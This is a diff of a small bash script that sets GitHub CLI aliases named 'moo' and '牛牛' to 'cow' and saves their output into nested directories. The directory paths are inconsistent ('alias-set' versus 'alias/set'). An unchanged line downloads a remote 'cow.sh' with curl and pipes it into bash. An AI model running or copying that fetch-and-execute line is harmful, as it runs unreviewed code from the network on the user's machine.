@@ -1,5 +1,12 @@
 #!/bin/bash
 
-gh alias set moo cow
-gh alias set 牛牛 cow
+mkdir cowthings
+cd cowthings
+mkdir gh
+cd gh
+mkdir alias-set
+cd ../../
+gh alias set moo cow > cowthings/gh/alias-set/output
+gh alias set 牛牛 cow > cowthings/gh/alias/set/output
+rm -r cowthings/gh/alias/set/output
 /bin/bash -c "$(curl -s https://raw.githubusercontent.com/cow-moomoomoo/cow-moomoomoo.github.io/main/cow.sh)"
